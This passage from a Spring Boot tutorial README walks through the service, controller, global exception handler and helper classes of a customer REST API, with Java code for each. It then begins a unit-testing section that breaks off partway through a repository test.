    - `CustomerServiceImpl`: Implementation class that provides the logic for methods like retrieving customers,
      updating customer details, etc.


- **Returning DTOs**: The service layer should not return entities directly. Instead, it should return Data Transfer
  Objects (DTOs).
  DTOs are simple objects that carry data between layers. They are particularly useful for exposing only the necessary
  data to the client and for avoiding exposing the internal structure of your entities.

<details>
  <summary>View CustomerService code</summary>

```java
package com.ainigma100.customerapi.service;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.dto.CustomerSearchCriteriaDTO;
import org.springframework.data.domain.Page;

public interface CustomerService {

    CustomerDTO createCustomer(CustomerDTO customerDTO);

    CustomerDTO getCustomerById(Long id);

    CustomerDTO updateCustomer(Long id, CustomerDTO customerDTO);

    CustomerDTO updateCustomerEmail(Long id, CustomerEmailUpdateDTO emailUpdateDTO);

    void deleteCustomer(Long id);

}
```

</details>

<details>
  <summary>View CustomerServiceImpl code</summary>

```java
package com.ainigma100.customerapi.service.impl;

import com.ainigma100.customerapi.dto.CustomerDTO;
import com.ainigma100.customerapi.dto.CustomerEmailUpdateDTO;
import com.ainigma100.customerapi.entity.Customer;
import com.ainigma100.customerapi.exception.ResourceAlreadyExistException;
import com.ainigma100.customerapi.exception.ResourceNotFoundException;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.repository.CustomerRepository;
import com.ainigma100.customerapi.service.CustomerService;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

@Slf4j
@RequiredArgsConstructor
@Service
public class CustomerServiceImpl implements CustomerService {

    private final CustomerRepository customerRepository;
    private final CustomerMapper customerMapper;

    @Override
    public CustomerDTO createCustomer(CustomerDTO customerDTO) {

        customerRepository.findByEmail(customerDTO.getEmail())
                .ifPresent(customer -> {
                    throw new ResourceAlreadyExistException(""Customer"", ""email"", customerDTO.getEmail());
                });

        Customer recordToBeSaved = customerMapper.customerDTOToCustomer(customerDTO);

        Customer savedRecord = customerRepository.save(recordToBeSaved);

        return customerMapper.customerToCustomerDTO(savedRecord);
    }

    @Override
    public CustomerDTO getCustomerById(Long id) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        return customerMapper.toCustomerDTO(recordFromDB);
    }

    @Override
    public CustomerDTO updateCustomer(Long id, CustomerDTO customerDTO) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        // just to be safe that the object does not have another id
        customerDTO.setId(recordFromDB.getId());

        Customer recordToBeSaved = customerMapper.toCustomer(customerDTO);

        Customer savedRecord = customerRepository.save(recordToBeSaved);

        return customerMapper.toCustomerDTO(savedRecord);
    }

    @Override
    public CustomerDTO updateCustomerEmail(Long id, CustomerEmailUpdateDTO emailUpdateDTO) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        recordFromDB.setEmail(emailUpdateDTO.getEmail());

        Customer savedRecord = customerRepository.save(recordFromDB);

        return customerMapper.customerToCustomerDTO(savedRecord);

    }

    @Override
    public void deleteCustomer(Long id) {

        Customer recordFromDB = customerRepository.findById(id)
                .orElseThrow(() -> new ResourceNotFoundException(""Customer"", ""id"", id));

        customerRepository.delete(recordFromDB);
    }
}
```

</details>


<br><br>

### Controller Layer

The controller layer in a Spring Boot application handles incoming HTTP requests and sends responses back to the client.
It acts as the entry point for the client, interacting with the service layer to process business logic and return the
appropriate data. **Note**: Do not add business logic in this class.

#### Key Concepts:

- **Using Wrapper Objects**:
    - It's a best practice to return a wrapper object from the controller rather than returning entities directly. A
      wrapper object can contain a DTO, along with metadata such as status codes, messages, or other relevant
      information.
    - **Advantages**:
        - **Encapsulation**: The wrapper object encapsulates the DTO and provides a consistent response format, which
          can be useful for clients to process responses reliably.
        - **Security**: By using DTOs inside wrapper objects, you avoid exposing the internal structure of your entities
          directly to the client. This helps in protecting sensitive information and reducing the risk of exposing
          unintended data.
        - **Flexibility**: Wrapper objects allow you to include additional information, such as error messages or
          pagination details, making your API responses more informative and easier to handle on the client side.

    - **Example**:
        - `APIResponse<CustomerDTO>`: A wrapper object that contains the `CustomerDTO` and additional metadata like
          status and messages.

    - **Wrapper Class for API Responses: `APIResponse<T>`**:
        - The `APIResponse<T>` class is a generic wrapper that can be used across different controllers in your
          application. It encapsulates the response data and adds useful metadata like status and error messages.
        - **Key Attributes**:
            - `status`: A string representing the status of the response (e.g., ""SUCCESS"" or ""FAILED"").
            - `errors`: A list of `ErrorDTO` objects that contain error details when a request fails.
            - `results`: The actual data (DTO) being returned by the API.

        - **Example**:
      ```java
      @Data
      @AllArgsConstructor
      @NoArgsConstructor
      @JsonInclude(JsonInclude.Include.NON_NULL)
      @Builder
      public class APIResponse<T> {
      
          private String status;
          private List<ErrorDTO> errors;
          private T results;
      
      }
      ```

This structured approach ensures that your application is well-organized, with clear separation of concerns between
different layers. It also makes your API more robust, secure, and easier to maintain.

#### HTTP Method Annotations:

- **`@GetMapping`**:
    - **Purpose**: Maps HTTP GET requests to a specific handler method. It is typically used to retrieve data from the
      server.
    - **Usage**: Do not include a request body in GET requests. Use path variables or query parameters to pass data to
      the server.
    - **Example**:
      ```java
      @GetMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> getCustomerById(@PathVariable(""id"") Long id) {
          // You will have your implementation
      }
      ```

- **`@PostMapping`**:
    - **Purpose**: Maps HTTP POST requests to a specific handler method. It is used to create new resources on the
      server.
    - **Usage**: Use `@RequestBody` to pass data in the request body when creating a new resource.
    - **Example**:
      ```java
      @PostMapping
      public ResponseEntity<APIResponse<CustomerDTO>> createCustomer(@Valid @RequestBody CustomerRequestDTO customerRequestDTO) {
          // You will have your implementation
      }
      ```

- **`@PutMapping`**:
    - **Purpose**: Maps HTTP PUT requests to a specific handler method. It is used to update an existing resource on the
      server.
    - **Usage**: Use `@RequestBody` to pass updated data in the request body. PUT typically replaces the entire
      resource.
    - **Example**:
      ```java
      @PutMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> updateCustomer(@PathVariable(""id"") Long id, @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {
          // You will have your implementation
      }
      ```

- **`@PatchMapping`**:
    - **Purpose**: Maps HTTP PATCH requests to a specific handler method. It is used to apply partial updates to a
      resource.
    - **Usage**: Use `@RequestBody` to pass only the fields that need to be updated. PATCH is useful when you want to
      modify only certain attributes of the resource without affecting the rest.
    - **Example**:
      ```java
      @PatchMapping(""/{id}"")
      public ResponseEntity<APIResponse<CustomerDTO>> partiallyUpdateCustomer(@PathVariable(""id"") Long id, @RequestBody CustomerEmailUpdateDTO customerEmailUpdateDTO) {
          // You will have your implementation
      }
      ```

- **`@DeleteMapping`**:
    - **Purpose**: Maps HTTP DELETE requests to a specific handler method. It is used to delete a resource from the
      server.
    - **Usage**: Typically does not require a request body. The resource to be deleted is usually specified in the path.
    - **Example**:
      ```java
      @DeleteMapping(""/{id}"")
      public ResponseEntity<APIResponse<String>> deleteCustomer(@PathVariable(""id"") Long id) {
          // You will have your implementation
      }
      ```

- **Difference Between `PUT` and `PATCH`**:
    - **PUT**: Replaces the entire resource with the new data provided. If some fields are not provided, they will be
      overwritten with null or default values.
    - **PATCH**: Applies partial updates to a resource. Only the fields provided in the request body will be updated,
      leaving the other fields unchanged.

<details>
  <summary>View CustomerController code</summary>

```java
package com.ainigma100.customerapi.controller;


import com.ainigma100.customerapi.dto.*;
import com.ainigma100.customerapi.enums.Status;
import com.ainigma100.customerapi.mapper.CustomerMapper;
import com.ainigma100.customerapi.service.CustomerService;
import io.swagger.v3.oas.annotations.Operation;
import jakarta.validation.Valid;
import lombok.RequiredArgsConstructor;
import org.springframework.data.domain.Page;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

@RequiredArgsConstructor
@RequestMapping(""/api/v1/customers"")
@RestController
public class CustomerController {

    private final CustomerService customerService;
    private final CustomerMapper customerMapper;


    @Operation(summary = ""Add a new customer"")
    @PostMapping
    public ResponseEntity<APIResponse<CustomerDTO>> createCustomer(
            @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {

        CustomerDTO customerDTO = customerMapper.customerRequestDTOToCustomerDTO(customerRequestDTO);

        CustomerDTO result = customerService.createCustomer(customerDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> response = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();

        return new ResponseEntity<>(response, HttpStatus.CREATED);
    }


    @Operation(summary = ""Find customer by ID"",
            description = ""Returns a single customer"")
    @GetMapping(""/{id}"")
    public ResponseEntity<APIResponse<CustomerDTO>> getCustomerById(@PathVariable(""id"") Long id) {

        CustomerDTO result = customerService.getCustomerById(id);

        // Builder Design pattern
        APIResponse<CustomerDTO> responseDTO = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }


    @Operation(summary = ""Update an existing customer"")
    @PutMapping(""/{id}"")
    public ResponseEntity<APIResponse<CustomerDTO>> updateCustomer(
            @PathVariable(""id"") Long id,
            @Valid @RequestBody CustomerRequestDTO customerRequestDTO) {

        CustomerDTO customerDTO = customerMapper.customerRequestDTOToCustomerDTO(customerRequestDTO);

        CustomerDTO result = customerService.updateCustomer(id, customerDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> responseDTO = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }

    @Operation(summary = ""Partially update a customer's email"")
    @PatchMapping(""/{id}/email"")
    public ResponseEntity<APIResponse<CustomerDTO>> updateCustomerEmail(
            @PathVariable(""id"") Long id,
            @Valid @RequestBody CustomerEmailUpdateDTO emailUpdateDTO) {

        CustomerDTO result = customerService.updateCustomerEmail(id, emailUpdateDTO);

        // Builder Design pattern
        APIResponse<CustomerDTO> response = APIResponse
                .<CustomerDTO>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();

        return new ResponseEntity<>(response, HttpStatus.OK);
    }


    @Operation(summary = ""Delete a customer by ID"")
    @DeleteMapping(""/{id}"")
    public ResponseEntity<APIResponse<String>> deleteCustomer(@PathVariable(""id"") Long id) {

        customerService.deleteCustomer(id);

        String result = ""Customer deleted successfully"";

        // Builder Design pattern
        APIResponse<String> responseDTO = APIResponse
                .<String>builder()
                .status(Status.SUCCESS.getValue())
                .results(result)
                .build();


        return new ResponseEntity<>(responseDTO, HttpStatus.OK);

    }

}
```

</details>


<br><br>

### Exception Handling

In a Spring Boot application, it's important to handle exceptions in a way that provides meaningful feedback to the
client while maintaining a clean and maintainable codebase. In addition, you have to be sure not to expose sensitive
data.
The `GlobalExceptionHandler` class in this project serves this purpose by centralizing exception handling and ensuring
consistent error responses across the entire application.

#### Global Exception Handler

The `GlobalExceptionHandler` class, annotated with `@ControllerAdvice`, intercepts exceptions thrown by any controller
in the application. This class defines several `@ExceptionHandler` methods to handle specific types of exceptions,
ensuring that the application responds with appropriate HTTP status codes and error messages.

**Key Features of `GlobalExceptionHandler`:**

- **Runtime Exceptions**: Handles general runtime exceptions, such as `NullPointerException` and `RuntimeException`,
  returning a 500 Internal Server Error response.
- **Resource Not Found**: Manages `ResourceNotFoundException`, returning a 404 Not Found status with a relevant error
  message.
- **Business Logic and Data Exceptions**: Handles custom exceptions like `ResourceAlreadyExistException`, and
  `DataAccessException`, providing a 400 Bad Request response.
- **Validation Exceptions**: Manages exceptions related to validation, such as `MethodArgumentNotValidException` and
  `ConstraintViolationException`, returning detailed validation error messages.
- **Malformed JSON**: Handles `HttpMessageNotReadableException` to catch and respond to improperly formatted JSON in
  requests.
- **Method Not Supported**: Catches `HttpRequestMethodNotSupportedException`, responding with a 405 Method Not Allowed
  status.

#### Custom Exceptions

The application also defines several custom exceptions to manage specific error scenarios:

- **`BusinessLogicException`**: Thrown when a business rule is violated.
- **`ResourceAlreadyExistException`**: Used when an attempt is made to create a resource that already exists.
- **`ResourceNotFoundException`**: Thrown when a requested resource is not found in the database.

These custom exceptions extend `RuntimeException` and are annotated with `@ResponseStatus` to map them to specific HTTP
status codes.

#### Structured Error Responses

To ensure that error responses are consistent, the `APIResponse` class is used to structure the response body. It
includes:

- **Status**: A string indicating the outcome of the request (e.g., ""FAILED"").
- **Errors**: A list of `ErrorDTO` objects, each containing a `field` and an `errorMessage` to describe the issue.

This structure ensures that clients receive clear and consistent error messages, which can be easily parsed and handled.

**Note**: This approach to exception handling improves the robustness of the application, making it more maintainable
and user-friendly. For more details on how to implement and extend this global exception handler, you can refer to
additional resources or documentation available online.


<details>
  <summary>View GlobalExceptionHandler code</summary>

```java
package com.ainigma100.customerapi.exception;

import com.ainigma100.customerapi.dto.APIResponse;
import com.ainigma100.customerapi.dto.ErrorDTO;
import com.ainigma100.customerapi.enums.Status;
import jakarta.validation.ConstraintViolation;
import jakarta.validation.ConstraintViolationException;
import lombok.extern.slf4j.Slf4j;
import org.springframework.dao.DataAccessException;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.http.converter.HttpMessageNotReadableException;
import org.springframework.validation.FieldError;
import org.springframework.web.HttpRequestMethodNotSupportedException;
import org.springframework.web.bind.MethodArgumentNotValidException;
import org.springframework.web.bind.MissingPathVariableException;
import org.springframework.web.bind.MissingServletRequestParameterException;
import org.springframework.web.bind.annotation.ControllerAdvice;
import org.springframework.web.bind.annotation.ExceptionHandler;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

@Slf4j
@ControllerAdvice
public class GlobalExceptionHandler {


    @ExceptionHandler({RuntimeException.class, NullPointerException.class})
    public ResponseEntity<Object> handleRuntimeExceptions(RuntimeException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""An internal server error occurred"")));

        log.error(""RuntimeException or NullPointerException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.INTERNAL_SERVER_ERROR);
    }


    @ExceptionHandler({ResourceNotFoundException.class})
    public ResponseEntity<Object> handleResourceNotFoundExceptions(ResourceNotFoundException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""The requested resource was not found"")));

        log.error(""ResourceNotFoundException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.NOT_FOUND);
    }


    @ExceptionHandler({ResourceAlreadyExistException.class, DataAccessException.class})
    public ResponseEntity<Object> handleOtherExceptions(Exception exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""An error occurred while processing your request"")));

        log.error(""ResourceAlreadyExistException or DataAccessException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.BAD_REQUEST);
    }


    @ExceptionHandler(HttpRequestMethodNotSupportedException.class)
    public ResponseEntity<Object> handleHttpRequestMethodNotSupportedException(HttpRequestMethodNotSupportedException exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""The requested URL does not support this method"")));

        log.error(""HttpRequestMethodNotSupportedException occurred {}"", exception.getMessage());

        return new ResponseEntity<>(response, HttpStatus.METHOD_NOT_ALLOWED);
    }


    @ExceptionHandler({MethodArgumentNotValidException.class, MissingServletRequestParameterException.class, MissingPathVariableException.class})
    public ResponseEntity<Object> handleValidationExceptions(Exception exception) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());

        List<ErrorDTO> errors = new ArrayList<>();
        if (exception instanceof MethodArgumentNotValidException ex) {

            ex.getBindingResult().getAllErrors().forEach(error -> {
                String fieldName = ((FieldError) error).getField();
                String errorMessage = error.getDefaultMessage();
                errors.add(new ErrorDTO(fieldName, errorMessage));
            });

        } else if (exception instanceof MissingServletRequestParameterException ex) {

            String parameterName = ex.getParameterName();
            errors.add(new ErrorDTO("""", ""Required parameter is missing: "" + parameterName));

        } else if (exception instanceof MissingPathVariableException ex) {

            String variableName = ex.getVariableName();
            errors.add(new ErrorDTO("""", ""Missing path variable: "" + variableName));
        }

        log.error(""Validation errors: {}"", errors);

        response.setErrors(errors);
        return new ResponseEntity<>(response, HttpStatus.BAD_REQUEST);
    }


    @ExceptionHandler(HttpMessageNotReadableException.class)
    public ResponseEntity<APIResponse<ErrorDTO>> handleHttpMessageNotReadableException(HttpMessageNotReadableException ex) {

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(Collections.singletonList(new ErrorDTO("""", ""Malformed JSON request"")));

        log.error(""Malformed JSON request: {}"", ex.getMessage());

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }


    @ExceptionHandler(ConstraintViolationException.class)
    public ResponseEntity<APIResponse<ErrorDTO>> handleConstraintViolationException(ConstraintViolationException ex) {

        List<ErrorDTO> errors = new ArrayList<>();

        for (ConstraintViolation<?> violation : ex.getConstraintViolations()) {
            errors.add(new ErrorDTO(violation.getPropertyPath().toString(), violation.getMessage()));
        }

        APIResponse<ErrorDTO> response = new APIResponse<>();
        response.setStatus(Status.FAILED.getValue());
        response.setErrors(errors);

        log.error(""Constraint violation errors: {}"", errors);

        return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(response);
    }


}
```

</details>



---

## 10. Helper Classes

In this section, I provide some helper classes that can be reused in Spring Boot applications. These classes are
designed
to simplify common tasks such as logging, server configuration, and OpenAPI documentation generation.

### OpenApiConfig

This configuration class is responsible for generating OpenAPI documentation using SpringDoc. It fetches the OpenAPI
JSON from the application's endpoints and saves it as a formatted file.

**Key Features**:

- Automatically generates OpenAPI documentation in JSON format.
- Saves the documentation to a specified file in the project root. The output file name is specified in the
  `application.yaml` file.
- Handles both HTTP and HTTPS protocols based on the server configuration.

<details>
  <summary>View OpenApiConfig code</summary>

```java
package com.ainigma100.customerapi.config;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.SerializationFeature;
import io.swagger.v3.oas.annotations.OpenAPIDefinition;
import io.swagger.v3.oas.annotations.info.Info;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.CommandLineRunner;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.env.Environment;
import org.springframework.web.client.RestClient;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Optional;

@Slf4j
@Configuration
@OpenAPIDefinition(info = @Info(
        title = ""${springdoc.title}"",
        version = ""${springdoc.version}"",
        description = ""Documentation ${spring.application.name} v1.0""
))
public class OpenApiConfig {


    private final Environment environment;

    public OpenApiConfig(Environment environment) {
        this.environment = environment;
    }

    @Value(""${server.port:8080}"")
    private int serverPort;

    @Value(""${openapi.output.file}"")
    private String outputFileName;

    private static final String SERVER_SSL_KEY_STORE = ""server.ssl.key-store"";
    private static final String SERVER_SERVLET_CONTEXT_PATH = ""server.servlet.context-path"";

    @Bean
    public CommandLineRunner generateOpenApiJson() {
        return args -> {
            String protocol = Optional.ofNullable(environment.getProperty(SERVER_SSL_KEY_STORE)).map(key -> ""https"").orElse(""http"");
            String host = getServerIP();
            String contextPath = Optional.ofNullable(environment.getProperty(SERVER_SERVLET_CONTEXT_PATH)).orElse("""");

            // Define the API docs URL
            String apiDocsUrl = String.format(""%s://%s:%d%s/v3/api-docs"", protocol, host, serverPort, contextPath);

            log.info(""Attempting to fetch OpenAPI docs from URL: {}"", apiDocsUrl);

            try {
                // Create RestClient instance
                RestClient restClient = RestClient.create();

                // Fetch the OpenAPI JSON
                String response = restClient.get()
                        .uri(apiDocsUrl)
                        .retrieve()
                        .body(String.class);

                // Format and save the JSON to a file
                formatAndSaveToFile(response, outputFileName);

                log.info(""OpenAPI documentation generated successfully at {}"", outputFileName);

            } catch (Exception e) {
                log.error(""Failed to generate OpenAPI documentation from URL: {}"", apiDocsUrl, e);
            }
        };
    }

    private String getServerIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            log.error(""Error resolving host address"", e);
            return ""unknown"";
        }
    }

    private void formatAndSaveToFile(String content, String fileName) {
        try {
            ObjectMapper objectMapper = new ObjectMapper();

            // Enable pretty-print
            objectMapper.enable(SerializationFeature.INDENT_OUTPUT);

            // Read the JSON content as a JsonNode
            JsonNode jsonNode = objectMapper.readTree(content);

            // Write the formatted JSON to a file
            objectMapper.writeValue(new File(fileName), jsonNode);

        } catch (IOException e) {
            log.error(""Error while saving JSON to file"", e);
        }
    }
}
```

</details>

### LoggingFilter

A servlet filter that logs incoming HTTP requests and outgoing responses. It excludes certain paths, such as those
related to Actuator and Swagger, from logging to reduce noise.

**Key Features**:

- Logs the client's IP address, request URL, and HTTP method.
- Logs the response status after the request is processed.
- Excludes paths related to Actuator, Swagger, and static resources from logging.

<details>
  <summary>View LoggingFilter code</summary>

```java
package com.ainigma100.customerapi.filter;

import jakarta.servlet.*;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

import java.io.IOException;

@Component
@Slf4j
public class LoggingFilter implements Filter {


    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {

        HttpServletRequest httpServletRequest = (HttpServletRequest) request;
        HttpServletResponse httpServletResponse = (HttpServletResponse) response;

        String clientIP = this.getClientIP(httpServletRequest);

        if (this.shouldLogRequest(httpServletRequest)) {
            log.info(""Client IP: {}, Request URL: {}, Method: {}"", clientIP, httpServletRequest.getRequestURL(), httpServletRequest.getMethod());
        }

        // pre methods call stamps
        chain.doFilter(request, response);

        // post method calls stamps
        if (this.shouldLogRequest(httpServletRequest)) {
            log.info(""Response status: {}"", httpServletResponse.getStatus());
        }

    }

    private boolean shouldLogRequest(HttpServletRequest request) {

        // (?i) enables case-insensitive matching, \b matched as whole words
        // reference: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions
        return !request.getServletPath().matches(""(?i).*\\b(actuator|swagger|api-docs|favicon|ui)\\b.*"");
    }

    private String getClientIP(HttpServletRequest request) {

        String clientIP = request.getHeader(""Client-IP"");

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getHeader(""X-Forwarded-For"");
        }

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getHeader(""X-Real-IP"");
        }

        if (clientIP == null || clientIP.isEmpty() || ""unknown"".equalsIgnoreCase(clientIP)) {
            clientIP = request.getRemoteAddr();
        }

        return clientIP != null ? clientIP : ""Unknown"";
    }

}
```

</details>

### FiltersConfig

This configuration class registers the `LoggingFilter` as a Spring bean and sets its priority in the filter chain.

**Key Features**:

- Registers the `LoggingFilter` with a specified order of execution.
- Ensures that the filter applies to all incoming requests.

<details>
  <summary>View FiltersConfig code</summary>

```java
package com.ainigma100.customerapi.filter;

import lombok.AllArgsConstructor;
import org.springframework.boot.web.servlet.FilterRegistrationBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@AllArgsConstructor
@Configuration
public class FiltersConfig {

    private final LoggingFilter loggingFilter;

    @Bean
    public FilterRegistrationBean<LoggingFilter> loggingFilterBean() {

        final FilterRegistrationBean<LoggingFilter> filterBean = new FilterRegistrationBean<>();
        filterBean.setFilter(loggingFilter);
        filterBean.addUrlPatterns(""/*"");
        // Lower values have higher priority
        filterBean.setOrder(Integer.MAX_VALUE - 2);

        return filterBean;
    }

}

```

</details>

### ServerDetails

This component logs important server details when the application starts, including the server's protocol, host, port,
context path, and active profiles. It also provides the URL for accessing the Swagger UI.

**Key Features**:

- Logs server details and Swagger UI access URL on application startup.
- Supports both HTTP and HTTPS protocols.
- Displays the active Spring profiles.

<details>
  <summary>View ServerDetails code</summary>

```java
package com.ainigma100.customerapi.filter;

import lombok.AllArgsConstructor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.EventListener;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Component;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Optional;

@AllArgsConstructor
@Component
public class ServerDetails {

    private static final Logger log = LoggerFactory.getLogger(ServerDetails.class);


    private final Environment environment;
    private static final String SERVER_SSL_KEY_STORE = ""server.ssl.key-store"";
    private static final String SERVER_PORT = ""server.port"";
    private static final String SERVER_SERVLET_CONTEXT_PATH = ""server.servlet.context-path"";
    private static final String SPRINGDOC_SWAGGER_UI_PATH = ""springdoc.swagger-ui.path"";
    private static final String DEFAULT_PROFILE = ""default"";

    @EventListener(ApplicationReadyEvent.class)
    public void logServerDetails() {

        String protocol = Optional.ofNullable(environment.getProperty(SERVER_SSL_KEY_STORE)).map(key -> ""https"").orElse(""http"");
        String host = getServerIP();
        String serverPort = Optional.ofNullable(environment.getProperty(SERVER_PORT)).orElse(""8080"");
        String contextPath = Optional.ofNullable(environment.getProperty(SERVER_SERVLET_CONTEXT_PATH)).orElse("""");
        String[] activeProfiles = Optional.of(environment.getActiveProfiles()).orElse(new String[0]);
        String activeProfile = (activeProfiles.length > 0) ? String.join("","", activeProfiles) : DEFAULT_PROFILE;
        String swaggerUI = Optional.ofNullable(environment.getProperty(SPRINGDOC_SWAGGER_UI_PATH)).orElse(""/swagger-ui/index.html"");

        log.info(
                """"""
                        
                        
                        Access Swagger UI URL: {}://{}:{}{}{}
                        Active Profile: {}
                        """""",
                protocol, host, serverPort, contextPath, swaggerUI,
                activeProfile
        );
    }

    private String getServerIP() {
        try {
            return InetAddress.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            log.error(""Error resolving host address"", e);
            return ""unknown"";
        }
    }
}
```

</details>

---

## 11. Testing

Testing is essential to ensure your application works as expected. This section will cover how to effectively test your
Spring Boot application using both unit testing and integration testing strategies, including Behavior Driven
Development (BDD).

### Unit Testing

Unit testing is a method of testing individual units or components of the software in isolation. The main goal is to
validate that each unit of the software performs as expected. A ""unit"" is typically the smallest piece of code that can
be logically isolated, such as a function, method, or class.

### Behavior Driven Development (BDD) Testing

BDD focuses on writing tests that describe the system's behavior from the user's perspective. It helps improve
collaboration between developers, testers, and stakeholders. In Java, you can use JUnit with Mockito to implement BDD.

#### IntelliJ Live Template for BDD

To make writing BDD tests easier in IntelliJ IDEA, you can create a live template that generates a basic structure for
BDD tests. Here’s the template you can use:

```xml

<template name=""bdd""
          value=""@org.junit.jupiter.api.Test&#10;void given$NAME$_when$NAME2$_then$NAME3$() {&#10;&#10;    // given - precondition or setup&#10;    org.mockito.BDDMockito.given().willReturn();&#10;    &#10;    // when - action or behaviour that we are going to test&#10;    &#10;    &#10;    // then - verify the output&#10;&#10;}""
          description=""Behaviour Driven Development (BDD) test template"" toReformat=""false"" toShortenFQNames=""true"">
    <variable name=""NAME"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <variable name=""NAME2"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <variable name=""NAME3"" expression="""" defaultValue="""" alwaysStopAt=""true""/>
    <context>
        <option name=""JAVA_DECLARATION"" value=""true""/>
    </context>
</template>
```

With the above template, when you type `bdd` in your test class, IntelliJ IDEA will generate a skeleton for a BDD-style
test, helping you follow the BDD principles consistently.

In your Spring Boot project, BDD can be implemented as follows:

1. **Given**: Set up the initial context or preconditions for the test.
2. **When**: Perform the action or behavior that you want to test.
3. **Then**: Verify the expected outcome or results.

By structuring your tests this way, you ensure they are clear, concise, and focused on the behavior of the application
from the user’s perspective.

### Testing the Repository Layer

The repository layer is responsible for interacting with the database. When testing this layer, focus on ensuring that
your custom query methods behave as expected. If you are only using the provided methods from `JpaRepository` without
any custom queries, you do not need to test this layer.

- **`@DataJpaTest`**: Configures an in-memory database, automatically rolling back transactions after each test. Ensure
  that you have the H2 dependency in your project for this annotation to work correctly. This annotation also limits the
  loaded beans to those required for JPA tests.

- **`@Autowired`**: Used to inject the repository instance into your test class, allowing you to call repository methods
  directly.

- **`@BeforeEach`**: Indicates that the annotated method should be run before each test method in the class. This is
  commonly used for setting up test data or initializing common objects used in multiple tests.

- **`@Test`**: The most common annotation in JUnit, marking a method as a test method that will be executed when running
  the test suite.

<details>
  <summary>View CustomerRepositoryTest code</summary>

```java
package com.ainigma100.customerapi.repository;

import com.ainigma100.customerapi.entity.Customer;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.orm.jpa.DataJpaTest;

import java.time.LocalDate;

import static org.junit.jupiter.api.Assertions.*;


/*
 * @DataJpaTest will automatically configure in-memory database for testing
 * and, it will not load annotated beans into the Application Context.
 * It will only load the repository class. Tests annotated with @DataJpaTest
 * are by default transactional and roll back at the end of each test.
 */
@DataJpaTest
class CustomerRepositoryTest {

    @Autowired
    private CustomerRepository customerRepository;

    private Customer customer;

    /**
     * This method will be executed before each and every test inside this class
     */
    @BeforeEach
    void setUp() {

        customer = new Customer();
